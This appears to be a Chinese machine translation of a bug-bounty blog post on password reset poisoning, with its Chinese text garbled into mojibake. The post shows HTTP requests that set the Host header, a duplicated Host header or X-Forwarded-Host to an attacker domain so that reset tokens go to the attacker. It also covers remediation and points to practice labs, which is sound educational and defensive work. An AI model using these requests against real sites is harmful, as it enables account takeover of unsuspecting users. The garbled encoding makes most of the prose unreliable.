# åˆ©ç”¨å¯†ç é‡ç½®ä¸­æ¯’

> åŸæ–‡ï¼š<https://infosecwriteups.com/exploiting-password-reset-poisoning-b748797f0661?source=collection_archive---------1----------------------->

![](img/85a7fb778a8e9ebc3f9bc5d16d06dc4d.png)

æ¥è‡ª [Pixabay](https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1583432) çš„[æ‘„å½±å¸ˆ](https://pixabay.com/users/thedigitalway-3008341/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1583432)

è¿„ä»Šä¸ºæ­¢ï¼Œæˆ‘æœ€èµšé’±çš„ bug å¥–é‡‘ä¹‹ä¸€æ¥è‡ªä¸€ä¸ªå¯†ç é‡ç½®ä¸­æ¯’æ¼æ´ã€‚è¿™ç¯‡æ–‡ç« ä»‹ç»äº†å‘ç°ã€åˆ©ç”¨å’Œä¿®å¤è¿™ä¸ªæ¼æ´çš„è¿‡ç¨‹ï¼Œä»¥å¸®åŠ©ä½ åœ¨è‡ªå·±çš„æŠ«éœ²ä¸­è·å¾—æœ€å¤§çš„å›æŠ¥ï¼

# æ¦‚è§‚

å¯†ç é‡ç½®ä¸­æ¯’æ˜¯ä¸€ç§åŸºäºæ ‡é¢˜çš„æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµå¯†ç é‡ç½®é“¾æ¥çš„ URLã€‚é€šè¿‡åœ¨åº”ç”¨ç¨‹åºçš„å¯†ç é‡ç½®è¿‡ç¨‹ä¸­æ·»åŠ æˆ–ä¿®æ”¹ HTTP è¯·æ±‚å¤´å€¼ï¼Œæœ‰å¯èƒ½è¦†ç›–å‘é€ç»™ç”¨æˆ·çš„é“¾æ¥çš„åŸŸ:

```
Hi,Click the link below to reset your password:
https://<attacker-domain>/reset?token=123456789
```

å•å‡»åï¼Œé‡ç½®ä»¤ç‰Œä¼šè¢«è½¬å‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„åŸŸï¼Œä»è€Œå¯¼è‡´å¸æˆ·è¢«æ¥ç®¡ã€‚

![](img/6a84047576d5f0dcca41a1f8c104d299.png)

ä½œè€…ç…§ç‰‡

# å‰¥å‰Š

1.  å¯¼èˆªåˆ° web åº”ç”¨ç¨‹åºçš„â€œå¯†ç é‡ç½®â€é¡µé¢ã€‚
2.  è¾“å…¥ç›®æ ‡ç”¨æˆ·å¸æˆ·çš„åç§°ã€ç”¨æˆ·åæˆ–ç”µå­é‚®ä»¶ã€‚
3.  ä½¿ç”¨ web åº”ç”¨ç¨‹åºä»£ç†( *BurpSuiteã€OWASP-ZAP ç­‰*)æ‹¦æˆªè¯·æ±‚å¹¶å°†`Host:`å¤´å€¼ä¿®æ”¹ä¸ºæ”»å‡»è€…æ§åˆ¶çš„åœ°å€:
    *æ²¡æœ‰è‡ªå·±çš„æœåŠ¡å™¨ï¼Ÿæ‰“å—åˆä½œè€…é“¾æ¥æœ‰å¸®åŠ©*ğŸ™‚

```
POST /login/password-reset HTTP/1.1
Host: <attacker-domain>
..
{"email":"target-user@company.com"}
```

4.ç”¨æˆ·å°†ä»è¯¥ç½‘ç«™æ”¶åˆ°ä¸€å°åˆæ³•çš„å¯†ç é‡ç½®ç”µå­é‚®ä»¶ã€‚ä½†æ˜¯ï¼ŒåŒ…å«ç§˜å¯†é‡ç½®ä»¤ç‰Œçš„é“¾æ¥å°†æ˜¾ç¤ºæˆ‘ä»¬ä¿®æ”¹çš„å¤´å€¼:
`**https://<attacker-domain>/reset?token=123456789**`

5.ä¸€æ—¦ç”¨æˆ·å•å‡»ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ‹¦æˆªä»¤ç‰Œå¹¶åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šé‡æ”¾å…¶å€¼ï¼Œä»è€ŒæˆåŠŸé‡ç½®å—å®³è€…çš„å¯†ç ä»¥è¿›è¡Œå®Œå…¨å¸æˆ·æ¥ç®¡ï¼

![](img/2daa45d5cc9f1606517ed906bfb15502.png)

ç”± [PortSwigger](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning https://portswigger.net/web-security/images/password-reset-poisoning.svg) æ‰§è¡Œçš„å·¥ä½œæµ

# é«˜çº§å¼€å‘

ä¸»æœºå¤´ä¸èµ·ä½œç”¨ï¼Ÿå°è¯•è¿™äº›æŠ€å·§:

## **åŒä¸»æœºå¤´:**

æ ¹æ®æœåŠ¡å™¨å¯¹ HTTP è¯·æ±‚ä¸­é‡å¤çš„`Host`å¤´çš„ååº”ï¼Œæ¶æ„è¾“å…¥å¯èƒ½ä¼˜å…ˆäºé»˜è®¤è¾“å…¥:

```
POST /login/password-reset HTTP/1.1
Host: example.com
Host: <attacker-domain>
...
```

## **æµ‹è¯•è¦†ç›–æ ‡é¢˜:**

è¯¸å¦‚`X-Forwarded-Host`ã€`X-Forwarded-Server`ã€`X-HTTP-Host-Override`å’Œ `X-Host`ä¹‹ç±»çš„è¦†ç›–æ ‡å¤´æœ‰æ—¶å¯ä»¥æ›¿ä»£`Host`æ ‡å¤´å€¼ï¼Œä»è€ŒæˆåŠŸåˆ©ç”¨æ¼æ´:

```
POST /login/password-reset HTTP/1.1
Host: example.com
X-Forwarded-Host: <attacker-domain>
...
```

# è¡¥æ•‘

## ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ

å½“ç½‘ç«™ä¾é æ ‡é¢˜å€¼æ¥å¼•å¯¼æµé‡æˆ–åˆ¶ä½œé¡µé¢é“¾æ¥æ—¶ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå¯†ç é‡ç½®ä¸­æ¯’ã€‚å¦‚æœä¸åŠ æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»–ä»¬è‡ªå·±çš„å€¼å¹¶ä¿®æ”¹åº”ç”¨ç¨‹åºçš„é¢„æœŸè¡Œä¸ºã€‚

## æ€ä¹ˆä¿®ï¼Ÿ

æœ€ç®€å•çš„æ–¹æ³•æ˜¯é¿å…ä½¿ç”¨æ ‡é¢˜å€¼æ¥å®šä¹‰ç«™ç‚¹å¯¼èˆªã€‚è¯·æ±‚å¤´ä¸æ˜¯å—ä¿æŠ¤çš„å­—æ®µï¼Œå¯ä»¥è¢«ç”¨æˆ·ä¿®æ”¹ä»¥æ³¨å…¥æ¶æ„è¾“å…¥ã€‚æ­¤å¤–ï¼Œæ‰§è¡Œ`Host`å¤´éªŒè¯å¹¶ç§»é™¤å¯¹è¦†ç›–å¤´(å¦‚`X-Forwarded-Host`)çš„æ”¯æŒæ˜¯å¾ˆå¥½çš„ç¼“è§£ç­–ç•¥ã€‚

è¦äº†è§£æ›´å¤šé˜²èŒƒæ–¹æ³•ï¼Œè¯·æŸ¥çœ‹æœ¬æ–‡ä¸­[çš„](https://portswigger.net/web-security/host-header) [*é˜²èŒƒ HTTP ä¸»æœºæŠ¥å¤´æ”»å‡»*](https://portswigger.net/web-security/host-header) éƒ¨åˆ†ã€‚

# å®è·µèµ„æº

æƒ³è‡ªå·±è¯•è¯•è¿™ä¸ªæŠ€å·§å—ï¼Ÿç»“è´¦:

*   PortSwigger å®éªŒå®¤:[åŸºæœ¬å¯†ç é‡ç½®ä¸­æ¯’](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)ã€‚
*   PortSwigger å®éªŒå®¤:[é€šè¿‡ä¸­é—´ä»¶è¿›è¡Œå¯†ç é‡ç½®ä¸­æ¯’](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)ã€‚
*   PortSwigger Lab: [é€šè¿‡æ‚¬ç©ºæ ‡è®°è¿›è¡Œå¯†ç é‡ç½®ä¸­æ¯’](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)ã€‚

æ„Ÿè°¢é˜…è¯»ï¼åœ¨ [m8sec.dev](https://m8sec.dev) äº†è§£æ›´å¤šå…³äºæˆ‘çš„ä¿¡æ¯ï¼Œå¹¶å…³æ³¨æ›´å¤šæ”»å‡»æ€§å®‰å…¨å†…å®¹ã€‚

*å…è´£å£°æ˜:æ‰€æœ‰å†…å®¹ä»…ç”¨äºæ•™è‚²ç›®çš„ã€‚ä½œè€…ä¸å¯¹ä¿¡æ¯çš„ä½¿ç”¨è´Ÿè´£ã€‚ä¸è¦å¯¹ä½ ä¸æ‹¥æœ‰æˆ–æ²¡æœ‰æ˜ç¡®è®¸å¯çš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ã€‚*